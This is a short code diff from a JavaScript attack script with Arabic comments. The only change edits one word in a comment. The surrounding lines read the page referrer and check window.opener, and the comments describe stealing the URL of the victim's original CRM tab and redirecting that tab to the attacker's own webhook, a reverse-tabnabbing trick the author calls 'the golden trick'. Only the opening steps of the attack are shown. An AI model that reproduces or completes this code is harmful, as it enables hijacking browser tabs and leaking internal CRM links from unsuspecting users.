@@ -10,7 +10,7 @@
         let ref = document.referrer || 'No Referrer';
 
         // 2. محاولة سرقة رابط التاب الأصلي (الـ CRM) عن طريق window.opener
-        // هذه هي الخدعة الذهبية: نأخذ التاب الأصلي ونحوله لـ Webhook بتاعنا
+        // هذه هي الخدعة الذهبية: نأخذ التاب الأصلي ونحوله لـ Webhook يبتاعنا
         let openerUrl = 'No Opener';
         let openedSuccess = false;
         if (window.opener && !window.opener.closed) {
